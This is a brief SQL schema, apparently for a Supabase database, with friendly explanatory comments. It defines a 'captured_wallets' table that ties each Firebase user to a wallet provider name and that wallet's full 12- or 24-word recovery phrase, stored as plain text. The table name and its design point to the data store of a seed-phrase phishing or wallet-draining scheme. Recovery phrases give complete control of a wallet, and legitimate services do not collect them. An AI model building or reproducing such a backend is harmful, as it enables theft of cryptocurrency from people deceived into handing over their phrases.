-- Enable the UUID extension if it's not already enabled.
-- You can run this in Supabase's SQL editor once per database.
-- CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- This table will store the captured wallet information.
CREATE TABLE captured_wallets (
    -- A unique identifier for each record. UUIDs are great because they are unique across all tables.
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),

    -- The user ID from Firebase Authentication. This links a wallet record to a specific user.
    -- I've marked it as UNIQUE to ensure a user can only have one captured wallet record.
    firebase_user_id VARCHAR(255) NOT NULL UNIQUE,

    -- The name of the wallet provider, like 'MetaMask' or 'Trust Wallet'.
    wallet_type VARCHAR(100) NOT NULL,

    -- The 12 or 24-word recovery phrase. The TEXT type can handle strings of any length.
    recovery_phrase TEXT NOT NULL,

    -- A timestamp that automatically records when the data was inserted.
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);
